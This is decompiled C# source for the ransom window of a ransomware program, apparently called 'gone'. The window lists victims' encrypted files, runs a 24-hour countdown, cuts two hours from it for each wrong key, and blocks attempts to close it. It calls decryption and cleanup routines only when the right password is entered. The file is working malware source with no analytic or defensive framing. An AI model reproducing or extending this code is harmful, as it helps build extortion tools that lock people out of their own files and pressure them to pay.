using System;
using System.ComponentModel;
using System.Drawing;
using System.Timers;
using System.Windows.Forms;

namespace gone;

public class Form1 : Form
{
	private Timer t;

	private int h = 24;

	private int m;

	private int s;

	private IContainer components;

	private Label label1;

	private RichTextBox richTextBox1;

	private Label label2;

	private TextBox textBox1;

	private Button button1;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Invalid comparison between Unknown and I4
		((CancelEventArgs)(object)e).Cancel = (int)e.get_CloseReason() == 3;
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)textBox1).get_Text() == Encrypt.fPassword)
		{
			Encrypt.inPassword = Encrypt.fPassword;
			Program.Decrypt_All();
			Program.Remove_Root();
			MessageBox.Show("Files are decrypted!", "Success!", (MessageBoxButtons)0, (MessageBoxIcon)0);
			Application.Exit();
		}
		else
		{
			MessageBox.Show("Key is invalid!\n 2 hours knocked off :(", "Uh Oh!", (MessageBoxButtons)0, (MessageBoxIcon)16);
			h -= 2;
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		t = new Timer();
		t.Interval = 1000.0;
		t.Elapsed += OnTimeEvent;
		t.Start();
		foreach (string item in Encrypt.encryptedFileLog)
		{
			RichTextBox obj = richTextBox1;
			((Control)obj).set_Text(((Control)obj).get_Text() + "File Gone: " + item + "\r\n");
		}
	}

	private void OnTimeEvent(object sender, ElapsedEventArgs e)
	{
		((Control)this).Invoke((Delegate)(Action)delegate
		{
			if (s < 1)
			{
				s = 59;
				if (m == 0)
				{
					m = 59;
					if (h != 0)
					{
						h--;
					}
				}
				else
				{
					m--;
				}
			}
			else
			{
				s--;
			}
			if (s == 0 && m == 0)
			{
				_ = h;
			}
			((Control)label1).set_Text($"{h.ToString().PadLeft(2, '0')}:{m.ToString().PadLeft(2, '0')}:{s.ToString().PadLeft(2, '0')}");
		});
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Expected O, but got Unknown
		//IL_0160: Unknown result type (might be due to invalid IL or missing references)
		//IL_016a: Expected O, but got Unknown
		//IL_01d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01de: Expected O, but got Unknown
		//IL_0359: Unknown result type (might be due to invalid IL or missing references)
		//IL_0363: Expected O, but got Unknown
		label1 = new Label();
		richTextBox1 = new RichTextBox();
		label2 = new Label();
		textBox1 = new TextBox();
		button1 = new Button();
		((Control)this).SuspendLayout();
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 36f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.DarkRed);
		((Control)label1).set_Location(new Point(0, 0));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(799, 65));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("00:00:00");
		label1.set_TextAlign((ContentAlignment)32);
		((Control)richTextBox1).set_Location(new Point(12, 290));
		((Control)richTextBox1).set_Name("richTextBox1");
		((TextBoxBase)richTextBox1).set_ReadOnly(true);
		((Control)richTextBox1).set_Size(new Size(312, 148));
		((Control)richTextBox1).set_TabIndex(1);
		((Control)richTextBox1).set_Text("");
		((TextBoxBase)richTextBox1).set_WordWrap(false);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_Location(new Point(12, 267));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(118, 20));
		((Control)label2).set_TabIndex(2);
		((Control)label2).set_Text("Encrypted Files");
		((Control)textBox1).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox1).set_Location(new Point(470, 368));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(318, 31));
		((Control)textBox1).set_TabIndex(3);
		((Control)button1).set_Location(new Point(470, 405));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(318, 33));
		((Control)button1).set_TabIndex(4);
		((Control)button1).set_Text("Decrypt");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(800, 450));
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)richTextBox1);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
